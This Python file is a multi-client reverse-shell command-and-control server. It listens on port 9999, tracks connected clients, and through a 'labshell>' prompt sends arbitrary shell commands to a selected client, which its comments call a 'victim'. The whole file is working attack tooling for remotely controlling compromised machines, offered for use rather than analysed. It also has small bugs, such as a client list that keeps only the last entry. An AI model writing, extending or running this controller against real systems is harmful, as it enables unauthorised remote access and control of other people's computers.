#importing libraries
import socket
import sys
import threading
import time
from queue import Queue


#two threads, one for each task
#thread 1 - listen and accept connections from other clients
#thread 2 - sending commands to an already connrcted client 

Total_Threads = 2
Total_Jobs = [1, 2]
queue = Queue()                                   #queue stores the jobs to be done by threads
connection_array = []
address_array = []


# Creates a Socket (connects client to the server)
def create_socket():
    try:
        global host
        global port
        global socs
        host = ""
        port = 9999
        socs = socket.socket()

    except socket.error as msg:                     #Error message
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global socs
        print("Binding Port: " + str(port))

        socs.bind((host, port))                      #binds host and port together with a socket
        socs.listen(5)                               #listening to a client with atmost 5 connetion after which it thows error               

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")        #printing Error message and retrying using recursion 
        bind_socket()                                                          #recusrion


# Handling connection from multiple clients and saving to a list
# Closing previous connections when serverfin.py file is restarted

def fetch_connections():
    for c in connection_array:
        c.close()

    del connection_array[:]                                           #delete all connections
    del address_array[:]                                              #delete all addresses

    while True:                                                       #infinite loop
        try:
            conn, address = socs.accept()                             #conn is connection object and address stores ip and port 
            socs.setblocking(1)                                       # prevents timeout
 
            connection_array.append(conn)
            address_array.append(address)

            print("New Connection formed :" + address[0])

        except:
            print("Unable to accept connections")


# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# labshell> show
# 0 ip-address-A Port
# 1 ip-address-B Port
# 2 ip-address-C Port
# labshell> connect 1



def begin_labshell():

    while True:                                 #infinite loop
        cmd = input('labshell> ')
        if cmd == 'show':
            show_connections()                  #list all connections
        elif 'connect' in cmd:
            conn = get_connect(cmd)             #choose the connection
            if conn is not None:                #checking empty commands
                send_client_commands(conn)

        else:
            print("Invalid Command")


# Display all current active connections with client

def show_connections():
    results = ''

    for i, conn in enumerate(connection_array):
        try:
            conn.send(str.encode(' '))                    #connection check
            conn.recv(20480)
        except:
            del connection_array[i]                       #deletion of lost connecions
            del address_array[i]
            continue

        results = str(i) + "   " + str(address_array[i][0]) + "   " + str(address_array[i][1]) + "\n"          #stores details of all active connections

    print("----Available Clients List----" + "\n" + results)


# conneting to a desired client
def get_connect(cmd):
    try:
        target = cmd.replace('connect ', '')                                            # target = id
        target = int(target)
        conn = connection_array[target]                                                   #client selection
        print("server is now connected to :" + str(address_array[target][0]))
        print(str(address_array[target][0]) + ">", end="")
        return conn
        

    except:
        print("Invalid connection")
        return None


# Send commands to client/victim or a friend
def send_client_commands(conn):
    while True:                                                      #infinite loop
        try:
            cmd = input()  
            if cmd == 'exit':                                        #to quit the connection
                break
            if len(str.encode(cmd)) > 0:                             #command check
                conn.send(str.encode(cmd))                           #command send to client
                client_response = str(conn.recv(20480), "utf-8")     #response from the client
                print(client_response, end="")                       #prints response
        except:
            print("Error sending commands")
            break


# Creating threads
def new_workers():
    for _ in range(Total_Threads):
        t = threading.Thread(target=tasks)            # creating thread
        t.daemon = True                               #to release the memory after the program ends
        t.start()                                     #to start the thread


#this funtion distribute work according to the job number
#if job number in queue is 1 then handle connections
#if job number in queue is 2 then send commands
def tasks():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            fetch_connections()
        if x == 2:
            begin_labshell()

        queue.task_done()


def new_jobs():
    for x in Total_Jobs:
        queue.put(x)                                    #puts job number in queue 

    queue.join()


new_workers()
new_jobs()
